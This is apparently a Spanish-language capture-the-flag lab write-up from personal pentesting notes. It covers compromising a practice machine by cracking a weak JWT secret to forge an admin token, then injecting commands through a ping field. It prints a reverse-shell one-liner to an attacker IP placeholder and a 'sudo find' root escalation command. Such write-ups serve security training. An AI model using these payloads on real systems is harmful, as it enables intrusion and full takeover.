## Fase de Reconocimiento y Descubrimiento (Enumeración)

### Escaneo de Puertos (Nmap)
Realizamos un escaneo de puertos inicial con nmap para identificar los servicios activos:

![[Pasted image 20260624174525.png]]

**Servicios identificados:**
* **Puerto 22/TCP (SSH):** Puerto abierto para control remoto. Ver teoría en [[Pentesting Notes/1_Enumeration/SSH\|SSH.md]].
* **Puerto 80/TCP (HTTP):** Servidor web expuesto. Ver teoría en [[Pentesting Notes/1_Enumeration/HTTP & HTTPS\|HTTP & HTTPS.md]].

---

## Enumeración Web

### Inspección e Identificación de Directorios (WhatWeb / Gobuster)
Analizamos las tecnologías web mediante whatweb y los directorios mediante gobuster:

![[Pasted image 20260624174625.png]]

![[Pasted image 20260624174701.png]]

* **Hallazgo:** Identificamos rutas como `/dashboard` y `/admin`. Sin embargo, al intentar ingresar, redirigen directamente a `index.php`.

### Inspección de la Página de Inicio de Sesión
Accedemos a `index.php` donde nos encontramos con un formulario de inicio de sesión:

![[Pasted image 20260624174752.png]]

Tras probar credenciales genéricas (admin:admin, root:root) sin éxito, procedemos a inspeccionar el código fuente del sitio:

![[Pasted image 20260624174834.png]]

* **Hallazgo:** Localizamos credenciales hardcodeadas correspondientes a un usuario invitado: `guest:guest`.

### Acceso Inicial y Detección de JWT
Iniciamos sesión con las credenciales `guest:guest`:

![[Pasted image 20260624174904.png]]

Ingresamos al panel de control, pero no contamos con acceso al panel de administrador. Observamos que la sesión utiliza un token JWT (JSON Web Token) almacenado en el cliente. Procedemos a inspeccionar la estructura del token:

![[Pasted image 20260624175005.png]]

* **Análisis del Token:** El token JWT utiliza el algoritmo de firma HS256 (criptografía simétrica, lo que significa que la clave secreta se usa tanto para firmar como para verificar el token).

---

## Fase de Explotación / Intrusión

### Crackeo de Token JWT
Utilizamos la herramienta de crackeo de firmas JWT (jwt-cracker) para intentar obtener la clave secreta por fuerza bruta o diccionario:

Enlace a la herramienta: https://github.com/lmammino/jwt-cracker

![[Pasted image 20260624175110.png]]

* **Resultado:** La herramienta determina que el secreto del JWT es `batman`.
* **Modificación del Token:** Con la clave secreta expuesta, alteramos los campos del payload de nuestro JWT para cambiar el rol o usuario a "admin" y volvemos a firmar el token utilizando el secreto `batman`:

![[Pasted image 20260624175241.png]]

![[Pasted image 20260624175424.png]]

### Comando de Inyección (RCE)
Con el nuevo token firmado como administrador, logramos acceder al panel del NOC (Network Operations Center):

![[Pasted image 20260624175448.png]]

Este panel cuenta con una utilidad de ping. Evaluamos si el input permite concatenación o inyección de comandos:

![[Pasted image 20260624175510.png]]

El input no está sanitizado, lo que nos permite inyectar comandos del sistema. Solicitamos una shell inversa a nuestra máquina atacante:

```bash
127.0.0.1; bash -c 'bash -i >& /dev/tcp/IP/PUERTO 0>&1'
```

![[Pasted image 20260624175607.png]]

Establecemos con éxito la shell inversa como el usuario `www-data`.

### Pivotaje de Usuario (`www-data` a `bruce`)
Enumerando el sistema de archivos, localizamos un archivo de configuración que expone credenciales en texto claro:

![[Pasted image 20260624175652.png]]

Verificando el archivo `/etc/passwd`, corroboramos la existencia del usuario `bruce` en la máquina. Usamos el comando `su` para cambiar de usuario utilizando la contraseña descubierta (`Arkh4m_Kn1ght!`):

```bash
su bruce
```

![[Pasted image 20260624175751.png]]

Obtenemos una sesión como el usuario `bruce`.

---

## Escalada de Privilegios

### Enumeración de Permisos Sudo
Verificamos los privilegios del comando sudo de los que dispone el usuario `bruce`:

![[Pasted image 20260624175834.png]]

* **Vulnerabilidad de Configuración:** El usuario `bruce` puede ejecutar el comando `find` (/usr/bin/find) como `root` sin necesidad de ingresar contraseña. Ver teoría en [[Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions\|Permissions.md]].

### Explotación del comando find
Aprovechamos la capacidad de ejecución de comandos integrados en `find` para solicitar una bash con permisos de root:

```bash
sudo /usr/bin/find . -exec /bin/bash -p \; -quit
```

![[Pasted image 20260624175904.png]]

¡Elevamos privilegios con éxito obteniendo control total de la máquina objetivo!

---

## Relaciones y Conceptos
* **Teoría:** [[Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions\|Linux Privilege Escalation - Permissions.md]], [[Pentesting Notes/1_Enumeration/SSH\|SSH.md]], [[Pentesting Notes/1_Enumeration/HTTP & HTTPS\|HTTP & HTTPS.md]]
* **Laboratorios Relacionados:** [Ninguno con técnicas similares documentadas actualmente]
